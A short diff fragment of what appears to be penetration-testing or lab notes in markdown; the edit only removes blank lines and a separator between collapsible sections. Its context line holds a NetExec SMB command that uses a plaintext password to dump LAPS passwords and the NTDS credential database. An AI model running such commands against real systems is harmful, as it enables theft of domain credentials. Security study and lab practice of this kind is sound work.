@@ -1100,9 +1100,6 @@ nxc smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
 </details>
 
 ---
-
-
----
 <details>
   <summary><strong>Group Policy Creator Owners</strong></summary>
 
